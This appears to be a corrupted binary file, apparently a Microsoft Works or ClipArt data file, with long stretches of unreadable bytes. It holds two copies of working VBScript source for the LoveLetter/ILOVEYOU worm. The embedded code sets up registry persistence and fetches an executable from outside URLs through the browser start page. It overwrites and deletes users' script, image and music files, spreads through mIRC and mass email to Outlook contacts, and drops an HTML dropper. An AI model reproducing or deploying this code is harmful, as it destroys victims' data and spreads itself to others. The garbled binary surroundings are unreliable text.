*YY ���*A����)�)򶢰�� �� � :ZY�����H0*K` �Ĺ�	S��	����� �����<pj���q:����H��XMH�ڠ����HP*H����ѳ)
:3��$3�Q��(01����	,  ��
����ؖ�˫�@����(�
!\p��ʩ�(3 #����r�8����əu)@#��	8 J��D�*���*����ʸ!l�C���ٙ�� �;���	r��@8�#٨������! c0���	;D����pb 3 �$��������� �I���	 ������ XA����	
:#(���5%p)"��¸��騈���5A
���E�=��ɪQI�I���c�"������#�H�HȄ�����P��R�$`8���
F� ����{�+���ꑩ��n������"K��� GB�����r "�)��8�	;��71���1�2	
I�S�1���� ڪ���+0�0�����H1�Ψ���"��2����,���ʐ��u E���ɀ��ऍ�##0���9�Ԉ����H�	q�сQ0 �ˈ�S�1��������>��$0TG* �3��w2 2!����ʻ��쉨��)���0�҈����z" 5��r�������A�C:6%Q�����Q��	����������� �P����٤�rU @���8%��騼'�!������2�UAR�	!�#Dy1 �!�4#@�����!� ��
��#�C�CB0e������( H8(	�-�ݪ�� 4H1 �4�� �""��C6QH��ؑ2�#�	T�	"�a:�����Ҙ���s 	��܃�z�����41!�#������5� �Y�� �ث�����E7!q���� ����%���[rem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\W ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            ipting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send����         ����         �  `*   	  0          L���   
 ��������������y�������������������������	� �" � ���������������������������s���\���D��-�����.���B���Q���a���q���������������������������������������������)���8���G���U���d���s�����t���g���[���O���D���;���3���-��)��'�-�'�B�+�3�%�$� ������������� ���(���/���6���<���B���H���M�r�R�e�V�W�Z�J�]�<�_�.�`�!�a��a��_���]��W�&�O�;�F�N�;�a�0�t�#�������������������������������������.���@���R�z�f�s�y�n���j���h���g���e���d���c�}�b�n�b�`�c�R�d�C�f�5�h�'�k��o��t���z�������������������������������������r���`� �c���h���n���t���{�����������������������������}���k���[���K��=��0�+�%�@��V��l�
L b �w �� �� �� �� �� �� �� �� �� �� �� �� z� r� _� L� :� (� � � � � � � � � � v %c 5N C8 O  Y [ \ \
 \ [��X��U��Q��C��3��#     ( � 0 � 8 � > � C � H � I � C � ; v 7 r � ��� ��� ��� ��� ��	���� ��(��K\��������h��L��0����������� ��0��?m�LP�X2�a�g��k��j��e��\��Q��C��3u�!l�e��a��^��\��[��\��]��`��d�wh�fn�Wu�G}�9��,�� ������� ��� ��� �� &�� B�� ^�� |�� I�y i�l ��^ ��M ��= ��- ��  � ;����� �� �� �� ����V��� v�B j�D _�G U�L L�R D�Z =�b 7�l 1�v ,�� (�� %�� "�� �� �� �� �� �� �� !�� "�� �� �	�����!��&��)��*��*��)��&��#x�j�[�M�N�	N�� K�� G�� 2�� �� �� ��� ��� ��� ��� ��� ��� ��� x�� _�I�#7�C*�b#�!�� �� ��"��&��-��8��H��   -    �    -    -    �  ���      -     8   $ ��������������t
�W�:�� ��� ��� ����9��X��v������v�������������������������   -    �    -    -    �   ww      -     >   $ s���k���e���c���d���i�k�q�R�~�9���"��*�q�4�c�?�W�L�L�Y�C�i�<�y�7���5���7���<���E���I���N���T���Z���`���f���m���s���   -    �    -    -    �  ���      -     �   $_ B�V�k���
������ ��������� �# �7 �J �\ �n �� �� d� I� S� \� e� n� u� }� �z �m �` �T �G �: �- �  � � ���������z��p��e��Z��N��B��6��*����������x�d�Q�
?�� 6�+�(�:
B�   -    �    -    -    �   ww      -     F   $! ������������������z��c��M��6�������������������������������������5��L��c��z��������������������   -    �    -    -    �   ww      -     .   $ -�r3�g7�[9�N9�A-�I �R�\�f��p��{���������������������%�|-�r   -    �    -    -    �  ���      -     R   $'   � 
 �� 	 �� ��* ��? ��S ��g ��V 	 B  ,   # ��* ��0 ��7 ��   -    �    -    -    �   ww      -     .   $ � � � � � � � � � x � � � � � �  � x � p � j � d � l � t � { � � � � � � � � � � �    -    �    -    -    �   ww      -         $ < ��G ��O ��U ��X �[ [�U a�O h�I p�D x�? ��< ��; ��< ��   -    �    -    -    �   ww      -     F   $!  �� �� ���������������������������������u���k���a���X���O���F���T���b���p���~��������������������������������������� �� �� ��   -    �    -    -    �   ww      -     �  $� [�x����������)Gvdm�b�W�K�>�1	""@� [� s� �� �r �J �# ���������������y��lp�_[�QH�D7�6&�)����������������m��I�
�� �   -    �    -    -    �  ���      -     &   $ ;�3�+�#������ �
'�
/�	7�
:�=�>�;�   -    �    -    -    �  ���      -     F   $! �������� ��� ��0��@��/����
����������������������������������������������������������   -    �    -    -    �  ���      -        $	 �y� m�\�I��7��H��X��i��y�   -    �    -    -    �   ww      -     F   $! ��������������������������������������v��k��a��m��y�����������������������������������������   -    �    -    -    �   ww      -     >   $ ������_��@��#���s��^��J��>��=��Bd�IH�>_�6w�1��0��1��6��>��J�X�i+�z<��M��^��r�������   -    �    -    -    �  ���      -     (   $ �� �} �{ �y �x �y �{ �} �� �� �� �� �� �� �� �� �� ��    -    �    -    -    �  ���      -     (   $ �> �: �8 �6 5 6 8 	: 
> 	A D E F �E �D �A �> �>    -    �    -    -    �  ���      -     (   $ ������������������������������������������������������   -    �    -    -    �  ���      -     (   $ �~��z��x��v��u��v��x��z��~�����������������������~��~�   -    �    -    -    �  ���      -     (   $ ������������������������������������������������������   -    �    -    -    �  ���      -     (   $ ������������������������������������������������������������������������   -    �    -    -    �  ���      -     (   $ ��.���+���)���'���&���'���)���+���.���2���4���6���7���6���4���2���.���.�   -    �    -    -    �  ���      -     (   $ 
�ʹBC8����#T�����)Aq(�ۡ��"����YH����#!�����1��� ���B���72!J��7F"��b2��!�58���**�
��ɡ�D�
��"���B!�6��"`q!��ʹ�� 0�<�ڡ���������̞�#2 �۲�
�8"B����ASJ��! ����R�)/����:��?J�����	������#�

���JH�������� <˺����
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\W                  t\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send�  ���All Categories C:\Program\Microsoft Works\workscor\j0160042.wmf   � �G� \�      �   � �7�         $=w� � PO4���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All Categories0C:\Program\Microsoft Works\workscor\j0160042.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  on
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
 ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            &vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     ˼2�*���'r	
(a���� c+
�Y��!H	" C�ɪ��I)����0X +	����2h˙�ʑ,��2��Ͽ��#�����2	D��	ˤ�	��7x	�� I��!��QT:	�ɨ� 	���"P��(���ޔ�8 2�����������(
븪JQ��'=,�؊��  �P����GS"$���B�QQ����@D��Ѓ3400���R�=��� tx ��	���BR$R����"�A#�*�و
���"����3 ������V	�����!�
��(���
��	�4EY9���� �A3��5�
�π�"�������������QE��	����9�r��PC6" ��
��5u�	q )Ԑ"����깑 b03����� "1 ��������
����$�!������CtA0��ʻʨ�*����BEB2AB0���F�$�(����ɨ!E40(����
�ʡ�����������2�"0AɎ�ڠ�r  ������c$AS�(@�1	�������Cc������&4s����˪���B2*8���ʈ�������5������U$3R�����@�ν���%5! �����&�(S�#���ɪ�DEB!		����#2AS)����411�4qr������cEB! ����	���$u4"#	��ʙ���B��5	c�)����� 4��麙�#	9������Q�������Cb ����Gs!���������7b1���$cB1 ���
���P  �����������Ꚑ����˛���#tC4�	�����2"���C���2v7 3���2TP3�F!����# !�:ɘ$�2����!���5q*��̬�˪ِ�)!���ˑ�5B ���ꨩ ������$"11�13��(%�3�&!��7�S4"�e 0����5�05C0(���� ��� GR��ۃ�sE 1�	ʹ��"�����C�����"�!�4V�3�2�*����! �!�	�2��B4 	���ڐ��"�%#AQ�"��ʓ�t5*1����D0������� c!# 	���e�A����삘b�������ڨ 0���̻�� 0 ��V4�(������s$ �����rB���' #9	̀�)��v2S�̚�ۨ�%0*ں���18	鋤�8����������"� ����� ���!�4�0�����!A��!"�B�2�5UaC��̐�F%21��ʈ#!$!)ɛ�AE�"!���Q����@C ��t4v@#c �ː7R2����0����g'2B���ʐ�6H έ���3610�٠�"������۹�(��7"0�����H4���1��ꪀ�5 1	܈�76B 1� �&S2����&�! ��ٸ!��
��꺁� �(�찪��F�3������ �����6"!����7F�ڨ������hq� (���"#Ͽ��
!a(�è�ί"������� 8�����!A��؊�0(Ҵ;��1��8sEH:��ʦ���pp�
����	*#��wc��J� ��#"Q>��ڻF10 ����0H		���4@���h1TT"����	 r���ۀ:X��(��y������,��yj��ʼ��X($%�ʐ�9��ʛ���I!"��K�%t�2*���"pp))
�ٻ�� ���?I������9H��
�����"9)���HZvH�������2��ω������ͩ��
��"�����	�����         ����       W  �  �K   	  �%   �
���
���	�������������������������������������������������������������s���a���M���8���8���&�����������������������������������������~���s���i���^���T���J���?���3���&�������|�	�����������������{���u���o���p���t�m�t�P�j�5�e�&�_��Y�	�T���P���M���L���N���W���_���d���f�}�f�}�d�r�`�h�Z�`�R�Y�M�W�H�T�B�R�=�P�7�N�2�L�,�I�'�G�,�=�3�3�:�)�A��G��K��M���L���I���F���B���?���:���6���0���+���%�������������������������������������������������������������������������������������v���k���`���T���G���=���3���)��� �����������������������.�	�/��0���1���1���2���3���4���6���7���9���<���>���?���?���>���<���<���=���?���@��A��D�~�H�w�M�p�S�j�Y�e�`�b�h�`�p�_�}�b���g���l���l���r���z���������x��o��j�-�l�A�n�A�p�H�q�Q�p�Y�n�`�i�f�e�l�`�r�]�y�Y��V���S���P���M���L���M���N���O���P���O���O���M���F���>���7���.��%���,��?�
������������ ���!���"���"���#���%���(���*���,���.���*���'���%���#���������������� ����� �
���	�����������������������������������������������������������������������������������{���w���t���l���e���]���V���N���G���@���9���4���0���+���'���"���������������������������������%���+���0���5���8���:���;���<���;���5���-��%�x��o��a��c�
�d��f���g���h���h���i���j���k���l���l���n���s���{��������������������������������������������������������������������������������������������������������"���,���4���<��?�
�C��F��J��M�!�R�&�W�+�]�(�\�#�[��Y��X��R� �L���E���=���4���)���������������������������������������������"���%���)���/���5���<���C���J���R���Z���c���f���j���o���s���������������������������������������������������������������������� ����������� ��-��9��E��F��G��G�
�]�
�Y���X���X���X���W���Q���I��>��3� �&�+��5��?���G���E��:��0��&�%��-��4��8���9���:���:���:���;���5���0���-���*���'���$��� �����������	��� ���&���,���1���/���&� ����	��
�R��L���F���?���^���a���e���i� �l��q��v�	�z�
���������������
�/��)��#����� �"���&���*���B���Z��p�������~��|���y���v���r���n���i���o���w����������������� ���������'���5���B���6���*��������������������������������������������������������������������&���.� �6��>��G��O��W��^��^��O��A��3��&������ �����������������!��)��1��9�)�@�6�F�D�L�S�P�c�S�l�V�c�V�Z�V�R�V�I�V�@�V�7�U�/�U�'�T�'�U�#�V��V��U��T��S��R�
���
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������ ���&���-���5���>���F���N���V���^���d���k���p���t���x���}�
���������)���3���>���B���G���M���S���Z���b���j���s���w���}�������������������������������������������������������������������������������
������*���9���I���X���h���y���|���~���������{���v���p���j���d���`���]���\���X���S�x�M�m�G�b�@�W�:�L�5�A�1�5�4�5�;�?�B�H�J�Q�S�Z�[�c�c�l�j�v�q����������������������������������������&���7���H���Y���j���{�������������������������������������������������������������������������������=���=���E���M���U���]���e���l���s���z���s���l���e���^���V���O���G���@���@���6���-���$���������
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s���b���O���=���,������ ��������}���u���k���_��Y�|�R�y�L�w�E�u�>�t�6�s�/�q�(�p�+�r�/�s�3�u�7�v�;�x�?�z�C�}�G��L���Q���U���Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
